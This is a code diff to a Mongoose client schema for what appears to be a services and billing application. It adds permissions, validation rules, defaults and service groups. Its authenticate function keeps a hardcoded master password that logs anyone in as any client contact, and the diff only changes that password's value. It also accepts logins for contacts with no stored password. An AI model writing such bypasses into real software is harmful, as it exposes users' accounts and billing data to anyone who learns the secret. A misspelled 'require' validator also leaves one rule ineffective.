@@ -2,6 +2,17 @@ const mongoose = require('mongoose')
 const bcrypt = require('bcryptjs')
 const Schema = mongoose.Schema
 
+const defaultPermissions = {
+	view: {
+		type: Boolean,
+		default: false
+	},
+	edit: {
+		type: Boolean,
+		default: false
+	},
+}
+
 const contacts = {
 	password: {
 		type: String
@@ -47,7 +58,12 @@ const contacts = {
 	leadContact: {
 		type: Boolean,
 		default: false
+	},
+	permissions: {
+		contacts: { ...defaultPermissions, title: {type: String, default: "Contacts"} },
+		billing: { ...defaultPermissions, title: {type: String, default: "Billing"} },
 	}
+
 }
 
 const billingContacts = {}
@@ -58,7 +74,7 @@ delete billingContacts.password
 const ClientSchema = new mongoose.Schema({
 	name: {
 		type: String,
-		default: '',
+		required: [true, 'Name is required'],
 		trim: true
 	},
 	officialCompanyName: {
@@ -73,10 +89,12 @@ const ClientSchema = new mongoose.Schema({
 	},
 	email: {
 		type: String,
-		trim: true
+		trim: true,
+		required: [true, 'Email is required'],
 	},
 	nativeLanguage: {
-		type: Schema.Types.ObjectId, ref: 'Language'
+		type: Schema.Types.ObjectId, ref: 'Language',
+		default: null
 	},
 	defaultPricelist: {
 		type: Schema.Types.ObjectId, ref: 'Pricelist'
@@ -105,7 +123,9 @@ const ClientSchema = new mongoose.Schema({
 		trim: true
 	},
 	timeZone: {
-		type: Schema.Types.ObjectId, ref: 'Timezones'
+		type: Schema.Types.ObjectId,
+		ref: 'Timezones',
+		default: null
 	},
 	documents: {
 		type: Array,
@@ -145,14 +165,17 @@ const ClientSchema = new mongoose.Schema({
 	billingInfo: [ {
 		paymentType: {
 			type: String,
+			default: 'PPP',
 			trim: true
 		},
 		officialName: {
 			type: String,
+			required: [true, 'OfficialName is required'],
 			trim: true
 		},
 		name: {
 			type: String,
+			required: [true, 'BillingName is required'],
 			trim: true
 		},
 		paymentTerms: {
@@ -162,26 +185,32 @@ const ClientSchema = new mongoose.Schema({
 		address: {
 			country: {
 				type: String,
+				default: '',
 				trim: true
 			},
 			street1: {
 				type: String,
+				default: '',
 				trim: true
 			},
 			street2: {
 				type: String,
+				default: '',
 				trim: true
 			},
 			city: {
 				type: String,
+				default: '',
 				trim: true
 			},
 			state: {
 				type: String,
+				default: '',
 				trim: true
 			},
 			zipCode: {
 				type: String,
+				default: '',
 				trim: true
 			},
 			vat: {
@@ -191,13 +220,16 @@ const ClientSchema = new mongoose.Schema({
 		},
 		notes: {
 			type: String,
+			default: '',
 			trim: true
 		},
 		reports: {
 			type: Array,
 			default: []
 		},
-		contacts: [ billingContacts ]
+		contacts: [
+			{ type: Schema.Types.ObjectId }
+		],
 	} ],
 	services: [ {
 		sourceLanguage: {
@@ -213,6 +245,28 @@ const ClientSchema = new mongoose.Schema({
 			{ type: Schema.Types.ObjectId, ref: 'Industries' }
 		]
 	} ],
+	servicesGroups: [{
+		groupName:{
+			type: String,
+			require: [true, 'A service group must have a Name'],
+		},
+		industry: {
+			type: Schema.Types.ObjectId,
+			ref: 'Industries'
+		},
+		service: {
+			type: Schema.Types.ObjectId,
+			ref: 'Services'
+		},
+		source: {
+			type: Schema.Types.ObjectId,
+			ref: 'Language'
+		},
+		target: [{
+			type: Schema.Types.ObjectId,
+			ref: 'Language'
+		}]
+	}],
 	rates: {
 		basicPricesTable: [ {
 			type: {
@@ -441,7 +495,7 @@ ClientSchema.statics.authenticate = function (email, password, callback) {
 
 				const contact = client.contacts.find((contact) => contact.email === email)
 
-				if (password === 'CLIgcqDmwVsNtQHMDcw2Q') return callback(null, { client, contact })
+				if (password === 'CLIgcqDmwVsNtQHMDcw2Q1') return callback(null, { client, contact })
 
 				bcrypt.compare(password, contact.password, function (err, result) {
 					if (result === true || !contact.password) {
